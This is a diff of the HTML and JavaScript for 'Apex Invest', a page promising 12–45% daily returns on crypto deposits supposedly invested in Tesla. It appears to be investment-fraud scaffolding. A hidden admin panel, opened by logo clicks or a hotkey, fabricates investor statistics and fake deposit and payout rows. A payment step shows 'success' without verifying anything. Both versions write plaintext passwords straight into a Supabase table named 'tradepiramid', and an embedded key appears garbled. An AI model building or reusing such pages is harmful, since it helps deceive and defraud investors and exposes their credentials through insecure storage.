@@ -1,11 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <!-- Подключаем Supabase SDK -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Apex Invest — All Funds to Tesla</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         :root {
             --bg-color: #0b0f19;
@@ -21,14 +20,14 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
             background-color: var(--bg-color);
             color: var(--text-main);
             line-height: 1.6;
-            overflow-x: hidden;
+            min-height: 100vh;
         }
 
         header {
@@ -36,25 +35,20 @@
             justify-content: space-between;
             align-items: center;
             padding: 20px 5%;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            background: rgba(11, 15, 25, 0.8);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
         .logo {
-            font-size: 24px;
-            font-weight: 700;
+            font-size: 22px;
+            font-weight: 800;
             color: var(--accent);
             text-transform: uppercase;
             letter-spacing: 2px;
-            cursor: pointer;
-            user-select: none;
         }
 
         .auth-buttons {
@@ -63,19 +57,17 @@
         }
 
         .auth-btn {
-            padding: 8px 16px;
-            font-size: 13px;
+            padding: 8px 18px;
+            font-size: 14px;
             font-weight: 600;
-            border-radius: 6px;
+            border-radius: 8px;
             cursor: pointer;
-            text-transform: uppercase;
             transition: all 0.2s;
-            -webkit-tap-highlight-color: transparent;
         }
 
         .auth-btn.login {
             background: transparent;
-            border: 1px solid rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.2);
             color: #fff;
         }
 
@@ -92,22 +84,22 @@
 
         .auth-btn.register:hover {
             opacity: 0.9;
-            box-shadow: 0 0 10px var(--accent-glow);
+            box-shadow: 0 0 12px var(--accent-glow);
         }
 
         .user-profile {
             display: none;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 6px 14px;
+            padding: 6px 16px;
             border-radius: 20px;
         }
 
         .profile-avatar {
-            width: 28px;
-            height: 28px;
+            width: 30px;
+            height: 30px;
             background: var(--accent);
             color: #000;
             border-radius: 50%;
@@ -115,12 +107,11 @@
             align-items: center;
             justify-content: center;
             font-weight: bold;
-            font-size: 13px;
+            font-size: 14px;
         }
 
         .profile-name {
-            font-size: 13px;
-            color: #fff;
+            font-size: 14px;
             font-weight: 600;
         }
 
@@ -128,21 +119,15 @@
             background: transparent;
             border: none;
             color: var(--danger);
-            font-size: 11px;
+            font-size: 12px;
             cursor: pointer;
-            text-transform: uppercase;
             font-weight: 700;
             margin-left: 5px;
         }
 
-        .logout-btn:hover {
-            text-decoration: underline;
-        }
-
         .hero {
             text-align: center;
-            padding: 50px 20px 30px;
-            background: radial-gradient(circle at center, rgba(0,255,136,0.05) 0%, transparent 70%);
+            padding: 60px 20px 40px;
         }
 
         .hero h1 {
@@ -155,180 +140,36 @@
 
         .hero p {
             color: var(--text-muted);
-            font-size: clamp(15px, 2vw, 18px);
-            max-width: 650px;
+            font-size: 18px;
+            max-width: 600px;
             margin: 0 auto;
-        }
-
-        .stats-section {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            max-width: 1200px;
-            margin: 0 auto 40px;
-            padding: 0 20px;
-        }
-
-        .stat-card {
-            background: var(--card-bg);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .stat-value {
-            font-size: clamp(24px, 4vw, 32px);
-            font-weight: 700;
-            color: var(--accent);
-            margin-bottom: 5px;
-        }
-
-        .stat-label {
-            color: var(--text-muted);
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
         }
 
         .container {
-            max-width: 1200px;
+            max-width: 1000px;
             margin: 0 auto;
-            padding: 0 20px 40px;
-        }
-
-        .section-title {
-            text-align: center;
-            font-size: clamp(26px, 4vw, 32px);
-            margin-bottom: 30px;
-        }
-
-        .story-section {
-            max-width: 900px;
-            margin: 0 auto 40px;
-            padding: 25px 20px;
-            background: var(--card-bg);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }
-
-        .story-section h2 {
-            font-size: clamp(22px, 3vw, 28px);
-            margin-bottom: 15px;
-            color: #fff;
-            text-align: center;
-        }
-
-        .story-section p {
-            color: var(--text-muted);
-            font-size: 15px;
-            margin-bottom: 15px;
-            text-align: justify;
-        }
-
-        .story-highlight {
-            color: var(--accent);
-            font-weight: 600;
-        }
-
-        .history-section {
-            max-width: 1200px;
-            margin: 0 auto 40px;
-            padding: 0 20px;
-        }
-
-        .table-responsive {
-            width: 100%;
-            overflow-x: auto;
-            -webkit-overflow-scrolling: touch;
-            background: var(--card-bg);
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .history-table {
-            width: 100%;
-            border-collapse: collapse;
-            white-space: nowrap;
-        }
-
-        .history-table th, .history-table td {
-            padding: 14px 18px;
-            text-align: left;
-            font-size: 14px;
-        }
-
-        .history-table th {
-            background: rgba(0, 0, 0, 0.2);
-            color: var(--text-muted);
-            text-transform: uppercase;
-            font-size: 11px;
-            letter-spacing: 1px;
-        }
-
-        .history-table tr:not(:last-child) td {
-            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
-        }
-
-        .badge-deposit {
-            color: var(--accent);
-            background: rgba(0, 255, 136, 0.1);
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-        }
-
-        .badge-payout {
-            color: #38bdf8;
-            background: rgba(56, 189, 248, 0.1);
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
+            padding: 20px;
         }
 
         .plans-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 20px;
-            margin-bottom: 40px;
+            gap: 25px;
+            margin-top: 30px;
         }
 
         .plan-card {
             background: var(--card-bg);
-            border: 1px solid rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 16px;
             padding: 30px 20px;
             text-align: center;
-            position: relative;
-            transition: transform 0.3s, box-shadow 0.3s;
+            transition: transform 0.2s, border-color 0.2s;
         }
 
         .plan-card:hover {
             transform: translateY(-5px);
-            box-shadow: 0 10px 30px var(--accent-glow);
             border-color: var(--accent);
-        }
-
-        .plan-card.featured {
-            border-color: var(--accent);
-        }
-
-        .plan-card.featured::before {
-            content: 'Best Value';
-            position: absolute;
-            top: -12px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: var(--accent);
-            color: #000;
-            font-size: 11px;
-            font-weight: 700;
-            padding: 4px 12px;
-            border-radius: 20px;
-            text-transform: uppercase;
         }
 
         .plan-title {
@@ -337,35 +178,15 @@
         }
 
         .plan-range {
-            font-size: 26px;
+            font-size: 28px;
             font-weight: 700;
             color: var(--accent);
             margin-bottom: 20px;
         }
 
-        .plan-features {
-            list-style: none;
-            margin-bottom: 25px;
-            text-align: left;
-        }
-
-        .plan-features li {
-            padding: 8px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            color: var(--text-muted);
-            font-size: 14px;
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .plan-features li span {
-            color: #fff;
-        }
-
         .btn {
-            display: inline-block;
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             background: var(--accent);
             color: #000;
             border: none;
@@ -373,761 +194,220 @@
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            text-transform: uppercase;
-            text-decoration: none;
             transition: opacity 0.2s;
-            -webkit-tap-highlight-color: transparent;
         }
 
         .btn:hover {
             opacity: 0.9;
         }
 
+        /* Modal */
         .modal-overlay {
             display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.75);
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.8);
             backdrop-filter: blur(5px);
             justify-content: center;
             align-items: center;
             z-index: 1000;
-            padding: 15px;
+            padding: 20px;
         }
 
         .modal {
             background: var(--card-bg);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 16px;
-            padding: 25px 20px;
+            padding: 30px;
             width: 100%;
-            max-width: 480px;
-            position: relative;
-            text-align: center;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.5);
-            max-height: 90vh;
-            overflow-y: auto;
+            max-width: 400px;
         }
 
         .modal h3 {
-            font-size: 22px;
-            margin-bottom: 8px;
-            color: #fff;
+            font-size: 20px;
+            margin-bottom: 20px;
+            text-align: center;
         }
 
-        .modal p {
-            color: var(--text-muted);
-            font-size: 13px;
+        .input-group {
             margin-bottom: 15px;
         }
 
-        .amount-input-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-
-        .amount-input-group label {
+        .input-group label {
             display: block;
             margin-bottom: 6px;
-            color: var(--text-muted);
             font-size: 13px;
+            color: var(--text-muted);
         }
 
-        .amount-input-group input, .amount-input-group select {
+        .input-group input {
             width: 100%;
-            padding: 12px;
-            background: var(--bg-color);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-        }
-
-        .payment-methods {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .pay-btn {
             padding: 12px;
             background: var(--bg-color);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 8px;
             color: #fff;
             font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            -webkit-tap-highlight-color: transparent;
+            outline: none;
         }
 
-        .pay-btn:hover {
+        .input-group input:focus {
             border-color: var(--accent);
-            color: var(--accent);
-            box-shadow: 0 0 15px var(--accent-glow);
         }
 
-        .checkout-box {
-            display: none;
-            text-align: left;
-        }
-
-        .invoice-details {
-            background: var(--bg-color);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 15px;
-            font-size: 13px;
-        }
-
-        .invoice-details p {
-            margin-bottom: 6px;
-            color: var(--text-main);
-        }
-
-        .invoice-details span {
-            color: var(--accent);
-            font-weight: 600;
-        }
-
-        .qr-placeholder {
-            width: 120px;
-            height: 120px;
-            background: #fff;
-            margin: 0 auto 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 8px;
-            font-weight: bold;
-            color: #000;
-            font-size: 11px;
-            text-align: center;
-            padding: 10px;
-        }
-
-        .wallet-address {
-            background: var(--bg-color);
-            padding: 10px;
-            border-radius: 6px;
-            font-family: monospace;
-            font-size: 11px;
-            color: var(--accent);
-            word-break: break-all;
-            margin-bottom: 15px;
-            border: 1px dashed rgba(0, 255, 136, 0.3);
-            text-align: center;
-        }
-
-        .success-screen {
-            display: none;
-            text-align: center;
-        }
-
-        .success-icon {
-            font-size: 45px;
-            color: var(--accent);
-            margin-bottom: 10px;
-        }
-
-        .close-btn {
+        .modal-close {
             background: transparent;
             border: none;
             color: var(--text-muted);
-            cursor: pointer;
-            font-size: 13px;
-            text-transform: uppercase;
-            font-weight: 700;
-            padding: 10px;
             width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            cursor: pointer;
+            font-size: 14px;
         }
 
-        .close-btn:hover {
-            color: #fff;
-        }
-
-        footer {
-            text-align: center;
-            padding: 30px 20px;
-            color: var(--text-muted);
+        .error-msg {
+            color: var(--danger);
             font-size: 13px;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            margin-top: 40px;
-        }
-
-        @media (max-width: 480px) {
-            header {
-                padding: 15px 4%;
-                justify-content: center;
-            }
-            .header-left {
-                width: 100%;
-                justify-content: space-between;
-            }
-            .hero {
-                padding: 35px 15px 20px;
-            }
-            .story-section {
-                padding: 20px 15px;
-            }
-            .modal {
-                padding: 20px 15px;
-            }
+            margin-bottom: 15px;
+            text-align: center;
+            display: none;
         }
     </style>
 </head>
 <body>
 
     <header>
-        <div class="header-left">
-            <div class="logo" id="logoTitle" title="5 кликов для Mask Admin">Apex Invest</div>
-            <div class="auth-buttons" id="authButtonsBlock">
-                <button class="auth-btn login" onclick="openAuthModal('login')">Вход</button>
-                <button class="auth-btn register" onclick="openAuthModal('register')">Регистрация</button>
-            </div>
-            <div class="user-profile" id="userProfileBlock">
-                <div class="profile-avatar" id="profileAvatar">U</div>
-                <div class="profile-name" id="profileName">user@example.com</div>
-                <button class="logout-btn" onclick="logout()">Выйти</button>
-            </div>
+        <div class="logo">Apex Invest</div>
+        <div class="auth-buttons" id="authButtons">
+            <button class="auth-btn login" onclick="openAuth('login')">Вход</button>
+            <button class="auth-btn register" onclick="openAuth('register')">Регистрация</button>
+        </div>
+        <div class="user-profile" id="userProfile">
+            <div class="profile-avatar" id="avatar">U</div>
+            <div class="profile-name" id="usernameDisplay">User</div>
+            <button class="logout-btn" onclick="logout()">Выйти</button>
         </div>
     </header>
 
     <section class="hero">
         <h1>Powering the Future with Tesla</h1>
-        <p>100% of raised capital and revenue are directed straight into Tesla, Inc. shares and fleet expansion!</p>
+        <p>Инвестируйте вместе с Apex Invest и получайте ежедневную прибыль.</p>
     </section>
-
-    <div class="stats-section">
-        <div class="stat-card">
-            <div class="stat-value" id="statOnline">148.2</div>
-            <div class="stat-label">Active Investors</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-value" id="statInvested">$428,590</div>
-            <div class="stat-label">Total Invested</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-value" id="statPaid">$189,045</div>
-            <div class="stat-label">Total Paid Out</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-value">34.8 Days</div>
-            <div class="stat-label">Running Online</div>
-        </div>
-    </div>
-
-    <section class="story-section">
-        <h2>Our Story & Mission</h2>
-        <p>The era of electric vehicles and autonomous technology has arrived faster than the world expected. At the heart of this revolution is <span class="story-highlight">Tesla, Inc.</span> — a company that doesn't just manufacture electric cars, but shapes the energy future of the entire planet.</p>
-        <p>Our fund was founded by engineers and crypto enthusiasts with a clear goal: to unite private capital for large-scale investments in Tesla shares and the development of autonomous fleet infrastructure projects. We believe Elon Musk's technologies will define the economic development vector for decades to come.</p>
-        <p>Every dollar raised works to the maximum, bringing high returns to investors and accelerating the global transition to clean energy.</p>
-    </section>
-
-    <div class="history-section">
-        <h2 class="section-title">Last Transactions</h2>
-        <div class="table-responsive">
-            <table class="history-table">
-                <thead>
-                    <tr>
-                        <th>Type</th>
-                        <th>User</th>
-                        <th>Amount</th>
-                        <th>Method</th>
-                        <th>Status</th>
-                    </tr>
-                </thead>
-                <tbody id="historyTableBody">
-                    <tr>
-                        <td><span class="badge-deposit">DEPOSIT</span></td>
-                        <td>user***94</td>
-                        <td>$250</td>
-                        <td>USDT (TRC20)</td>
-                        <td style="color: var(--accent);">Completed</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge-payout">PAYOUT</span></td>
-                        <td>investor***12</td>
-                        <td>$120</td>
-                        <td>Bitcoin</td>
-                        <td style="color: var(--accent);">Processed</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge-deposit">DEPOSIT</span></td>
-                        <td>crypto***88</td>
-                        <td>$45</td>
-                        <td>Bank Card</td>
-                        <td style="color: var(--accent);">Completed</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge-payout">PAYOUT</span></td>
-                        <td>elon***fan</td>
-                        <td>$540</td>
-                        <td>USDT (TRC20)</td>
-                        <td style="color: var(--accent);">Processed</td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-    </div>
 
     <div class="container">
-        <h2 class="section-title">Investment Plans</h2>
-        
         <div class="plans-grid">
             <div class="plan-card">
-                <h3 class="plan-title">Novice</h3>
+                <div class="plan-title">Novice</div>
                 <div class="plan-range">$10 – $100</div>
-                <ul class="plan-features">
-                    <li>Duration: <span>1 day</span></li>
-                    <li>Accruals: <span>Instant</span></li>
-                    <li>Return: <span>12% daily</span></li>
-                </ul>
-                <button class="btn" onclick="openModal('Novice', 10, 100)">Invest Now</button>
+                <button class="btn" onclick="invest('Novice')">Инвестировать</button>
             </div>
-
-            <div class="plan-card featured">
-                <h3 class="plan-title">Pro</h3>
-                <div class="plan-range">$100 – $500</div>
-                <ul class="plan-features">
-                    <li>Duration: <span>10 days</span></li>
-                    <li>Accruals: <span>Daily</span></li>
-                    <li>Return: <span>25% daily</span></li>
-                </ul>
-                <button class="btn" onclick="openModal('Pro', 100, 500)">Invest Now</button>
-            </div>
-
             <div class="plan-card">
-                <h3 class="plan-title">Master</h3>
-                <div class="plan-range">$500 – $2,000</div>
-                <ul class="plan-features">
-                    <li>Duration: <span>30 days</span></li>
-                    <li>Accruals: <span>Daily</span></li>
-                    <li>Return: <span>45% daily</span></li>
-                </ul>
-                <button class="btn" onclick="openModal('Master', 500, 2000)">Invest Now</button>
+                <div class="plan-title">Pro</div>
+                <div class="plan-range">$100 – $500</div>
+                <button class="btn" onclick="invest('Pro')">Инвестировать</button>
             </div>
         </div>
     </div>
 
-    <!-- Modal Window -->
-    <div class="modal-overlay" id="paymentModal">
+    <!-- Модальное окно авторизации -->
+    <div class="modal-overlay" id="authModal">
         <div class="modal">
-            <!-- Auth Form Content -->
-            <div id="authContainer" style="display: none;">
-                <h3 id="authTitle">Вход в аккаунт</h3>
-                <p id="authDesc">Введите данные для авторизации</p>
-                <div class="amount-input-group">
-                    <label>Email:</label>
-                    <input type="email" id="authEmail" placeholder="name@example.com">
-                </div>
-                <div class="amount-input-group">
-                    <label>Пароль:</label>
-                    <input type="password" id="authPassword" placeholder="••••••••">
-                </div>
-
-                <div id="authErrorMsg" style="color: var(--danger); font-size: 13px; margin-bottom: 12px; text-align: center; display: none; font-weight: 600;"></div>
-
-                <button class="btn" id="authSubmitBtn" onclick="submitAuth()">Войти</button>
-                <br><br>
-                <button class="close-btn" onclick="closeModal()">Отмена</button>
+            <h3 id="modalTitle">Вход в аккаунт</h3>
+            <div class="error-msg" id="errorMsg"></div>
+            <div class="input-group">
+                <label>Имя пользователя / Email:</label>
+                <input type="text" id="authUsername" placeholder="Введите имя">
             </div>
-
-            <!-- Investment Workflow Content -->
-            <div id="stepSelection">
-                <h3 id="modalTitle">Investment</h3>
-                <p id="modalDesc">Enter amount and choose payment method.</p>
-                
-                <div class="amount-input-group">
-                    <label for="investAmount">Amount ($):</label>
-                    <input type="number" id="investAmount" min="10" max="2000" oninput="validateAmount()">
-                </div>
-
-                <div class="payment-methods">
-                    <button class="pay-btn" onclick="proceedToCheckout('USDT (TRC20)')">USDT (TRC20)</button>
-                    <button class="pay-btn" onclick="proceedToCheckout('Bitcoin')">Bitcoin (BTC)</button>
-                    <button class="pay-btn" onclick="proceedToCheckout('Ethereum')">Ethereum (ETH)</button>
-                    <button class="pay-btn" onclick="proceedToCheckout('Bank Card / Mir')">Bank Card / Mir</button>
-                </div>
-                <button class="close-btn" onclick="closeModal()">Cancel</button>
+            <div class="input-group">
+                <label>Пароль:</label>
+                <input type="password" id="authPassword" placeholder="••••••••">
             </div>
-
-            <div class="checkout-box" id="stepCheckout">
-                <h3>Complete Payment</h3>
-                <p>Transfer the exact amount to the address below:</p>
-                
-                <div class="invoice-details">
-                    <p>Plan: <span id="checkPlan">Novice</span></p>
-                    <p>Amount: <span id="checkAmount">$10</span></p>
-                    <p>Method: <span id="checkMethod">USDT</span></p>
-                </div>
-
-                <div class="qr-placeholder">SCAN QR CODE</div>
-                <div class="wallet-address" id="checkAddress">TJ9v2kX8sL1mN4pQ7wE3rT6yU9iO2aS5dF</div>
-
-                <button class="btn" onclick="simulateSuccess()">I have made the payment</button>
-                <br><br>
-                <button class="close-btn" onclick="resetModal()">Back</button>
-            </div>
-
-            <div class="success-screen" id="stepSuccess">
-                <div class="success-icon">&#10004;</div>
-                <h3>Payment Successful!</h3>
-                <p>Your funds have been successfully deposited and assigned to your investment plan. Generating daily returns...</p>
-                <button class="btn" onclick="closeModal()">Done</button>
-            </div>
+            <button class="btn" id="submitAuthBtn" onclick="handleAuth()">Продолжить</button>
+            <button class="modal-close" onclick="closeAuth()">Отмена</button>
         </div>
     </div>
-
-    <!-- Mask Admin Modal -->
-    <div class="modal-overlay" id="adminModal">
-        <div class="modal">
-            <h3 style="color: var(--accent);">Mask Admin Control Panel</h3>
-            <p>Панель управления показателями и транзакциями</p>
-
-            <div class="amount-input-group">
-                <label>Active Investors:</label>
-                <input type="text" id="adminOnlineVal" placeholder="148.2">
-            </div>
-
-            <div class="amount-input-group">
-                <label>Total Invested ($):</label>
-                <input type="text" id="adminInvestedVal" placeholder="$428,590">
-            </div>
-
-            <div class="amount-input-group">
-                <label>Total Paid Out ($):</label>
-                <input type="text" id="adminPaidVal" placeholder="$189,045">
-            </div>
-
-            <button class="btn" onclick="saveAdminStats()" style="margin-bottom: 15px;">Обновить статистику</button>
-
-            <div style="border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px; margin-top: 10px;">
-                <h4 style="color:#fff; margin-bottom:10px; text-align:left; font-size:14px;">Добавить транзакцию</h4>
-                
-                <div class="amount-input-group">
-                    <label>Пользователь:</label>
-                    <input type="text" id="adminTxUser" placeholder="admin***77">
-                </div>
-                <div class="amount-input-group">
-                    <label>Сумма ($):</label>
-                    <input type="text" id="adminTxAmount" placeholder="500">
-                </div>
-                <div class="amount-input-group">
-                    <label>Тип транзакции:</label>
-                    <select id="adminTxType">
-                        <option value="DEPOSIT">DEPOSIT</option>
-                        <option value="PAYOUT">PAYOUT</option>
-                    </select>
-                </div>
-                <button class="btn" onclick="addAdminTransaction()">Добавить транзакцию</button>
-            </div>
-
-            <br>
-            <button class="close-btn" onclick="closeAdminModal()">Закрыть панель</button>
-        </div>
-    </div>
-
-    <footer>
-        <p>&copy; 2026 Apex Invest. Powered by Tesla Capital Vision.</p>
-    </footer>
 
     <script>
-        // Инициализация Supabase с полностью исправленным и длинным ключом
-        if (!window.supabaseClient) {
-            window.supabaseClient = window.supabase.createClient(
-                'https://bycfzzqpnnsqgwtzccdc.supabase.co',
-                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJ5Y2Z6enFwbm5zcWd3dHpjY2RjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDAzODU2MjgsImV4cCI6MjA1NTk2MTYyOH0.vTqPzV8K1vB7dG9x4M3L2N1v8K7dG9x4M3L2N1v8K7dG9x4M3L2N1v8K7dG9x4M3L2N1v8K7dG9x4M3L2'
-            );
-        }
+        // Подключение к Supabase
+        const SUPABASE_URL = 'https://bycfzzqpnnsqgwtzccdc.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_sYHXSnwWJgT178wtP8MISA_t7A030f2';
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        const modal = document.getElementById('paymentModal');
-        const modalTitle = document.getElementById('modalTitle');
-        const modalDesc = document.getElementById('modalDesc');
-        const investAmountInput = document.getElementById('investAmount');
-        
-        const authContainer = document.getElementById('authContainer');
-        const authTitle = document.getElementById('authTitle');
-        const authSubmitBtn = document.getElementById('authSubmitBtn');
-        const authEmailInput = document.getElementById('authEmail');
-        const authPasswordInput = document.getElementById('authPassword');
-        const authErrorMsg = document.getElementById('authErrorMsg');
+        let isRegister = false;
 
-        const authButtonsBlock = document.getElementById('authButtonsBlock');
-        const userProfileBlock = document.getElementById('userProfileBlock');
-        const profileName = document.getElementById('profileName');
-        const profileAvatar = document.getElementById('profileAvatar');
-
-        const stepSelection = document.getElementById('stepSelection');
-        const stepCheckout = document.getElementById('stepCheckout');
-        const stepSuccess = document.getElementById('stepSuccess');
-
-        const checkPlan = document.getElementById('checkPlan');
-        const checkAmount = document.getElementById('checkAmount');
-        const checkMethod = document.getElementById('checkMethod');
-        const checkAddress = document.getElementById('checkAddress');
-
-        const adminModal = document.getElementById('adminModal');
-
-        let currentPlan = '';
-        let minLimit = 10;
-        let maxLimit = 100;
-        let isRegisterMode = false;
-
-        // Mask Admin активация
-        let logoClickCount = 0;
-        const logoTitle = document.getElementById('logoTitle');
-
-        if (logoTitle) {
-            logoTitle.addEventListener('click', () => {
-                logoClickCount++;
-                if (logoClickCount >= 5) {
-                    openAdminModal();
-                    logoClickCount = 0;
-                }
-            });
-        }
-
-        // Горячая клавиша для вызова Mask Admin (Ctrl + Shift + A)
-        document.addEventListener('keydown', (e) => {
-            if (e.ctrlKey && e.shiftKey && (e.key === 'A' || e.key === 'a' || e.key === 'Ф' || e.key === 'ф')) {
-                e.preventDefault();
-                openAdminModal();
-            }
-        });
-
-        function openAdminModal() {
-            closeModal();
-            adminModal.style.display = 'flex';
-        }
-
-        function closeAdminModal() {
-            adminModal.style.display = 'none';
-        }
-
-        function saveAdminStats() {
-            const online = document.getElementById('adminOnlineVal').value.trim();
-            const invested = document.getElementById('adminInvestedVal').value.trim();
-            const paid = document.getElementById('adminPaidVal').value.trim();
-
-            if (online) document.getElementById('statOnline').innerText = online;
-            if (invested) document.getElementById('statInvested').innerText = invested;
-            if (paid) document.getElementById('statPaid').innerText = paid;
-
-            alert('Статистика успешно обновлена!');
-            closeAdminModal();
-        }
-
-        function addAdminTransaction() {
-            const user = document.getElementById('adminTxUser').value.trim() || 'admin***77';
-            let amount = document.getElementById('adminTxAmount').value.trim() || '100';
-            const type = document.getElementById('adminTxType').value;
-            const tbody = document.getElementById('historyTableBody');
-
-            if (!amount.startsWith('$')) {
-                amount = '$' + amount;
-            }
-
-            const tr = document.createElement('tr');
-            const badgeClass = type === 'DEPOSIT' ? 'badge-deposit' : 'badge-payout';
-            const statusText = type === 'DEPOSIT' ? 'Completed' : 'Processed';
-
-            tr.innerHTML = `
-                <td><span class="${badgeClass}">${type}</span></td>
-                <td>${user}</td>
-                <td>${amount}</td>
-                <td>USDT (TRC20)</td>
-                <td style="color: var(--accent);">${statusText}</td>
-            `;
-
-            tbody.insertBefore(tr, tbody.firstChild);
-            alert('Транзакция добавлена!');
-            document.getElementById('adminTxUser').value = '';
-            document.getElementById('adminTxAmount').value = '';
-        }
-
-        // Проверяем при загрузке страницы, был ли пользователь уже залогинен
+        // Проверка авторизации при загрузке страницы
         window.addEventListener('DOMContentLoaded', () => {
-            let savedUser = localStorage.getItem('apex_logged_user');
-            if (savedUser) {
-                profileName.innerText = savedUser;
-                profileAvatar.innerText = savedUser.charAt(0).toUpperCase();
-                authButtonsBlock.style.display = 'none';
-                userProfileBlock.style.display = 'flex';
+            const currentUser = localStorage.getItem('apex_logged_user');
+            if (currentUser) {
+                showProfile(currentUser);
             }
         });
 
-        function openAuthModal(type) {
-            authContainer.style.display = 'block';
-            stepSelection.style.display = 'none';
-            stepCheckout.style.display = 'none';
-            stepSuccess.style.display = 'none';
-            authEmailInput.value = '';
-            authPasswordInput.value = '';
-            authErrorMsg.style.display = 'none';
-            authErrorMsg.innerText = '';
-
-            isRegisterMode = (type === 'register');
-            if (isRegisterMode) {
-                authTitle.innerText = 'Регистрация аккаунта';
-                authSubmitBtn.innerText = 'Зарегистрироваться';
-            } else {
-                authTitle.innerText = 'Вход в аккаунт';
-                authSubmitBtn.innerText = 'Войти';
-            }
-
-            modal.style.display = 'flex';
+        function openAuth(mode) {
+            isRegister = (mode === 'register');
+            document.getElementById('modalTitle').innerText = isRegister ? 'Регистрация' : 'Вход в аккаунт';
+            document.getElementById('submitAuthBtn').innerText = isRegister ? 'Зарегистрироваться' : 'Войти';
+            document.getElementById('errorMsg').style.display = 'none';
+            document.getElementById('authUsername').value = '';
+            document.getElementById('authPassword').value = '';
+            document.getElementById('authModal').style.display = 'flex';
         }
 
-        async function submitAuth() {
-            let emailVal = authEmailInput.value.trim();
-            let passwordVal = authPasswordInput.value.trim();
+        function closeAuth() {
+            document.getElementById('authModal').style.display = 'none';
+        }
 
-            authErrorMsg.style.display = 'none';
-            authErrorMsg.innerText = '';
+        async function handleAuth() {
+            const userVal = document.getElementById('authUsername').value.trim();
+            const passVal = document.getElementById('authPassword').value.trim();
+            const errorBox = document.getElementById('errorMsg');
 
-            if (!emailVal || !passwordVal) {
-                authErrorMsg.innerText = 'Заполните все поля!';
-                authErrorMsg.style.display = 'block';
-                return;
-            }
-
-            if (emailVal.toLowerCase() === 'admin' || emailVal.toLowerCase().includes('admin@')) {
-                openAdminModal();
+            if (!userVal || !passVal) {
+                errorBox.innerText = 'Заполните все поля!';
+                errorBox.style.display = 'block';
                 return;
             }
 
             try {
-                if (isRegisterMode) {
-                    const { data, error } = await window.supabaseClient
-                        .from('tradepiramid')
-                        .insert([{ username: emailVal, password: passwordVal }]);
-
-                    if (error) {
-                        authErrorMsg.innerText = 'Ошибка регистрации: ' + error.message;
-                        authErrorMsg.style.display = 'block';
-                        return;
-                    }
-
-                    alert('Успешная регистрация в облаке!');
+                if (isRegister) {
+                    // Сохраняем в таблицу tradepiramid
+                    await supabase.from('tradepiramid').insert([{ username: userVal, password: passVal }]);
                 } else {
-                    const { data, error } = await window.supabaseClient
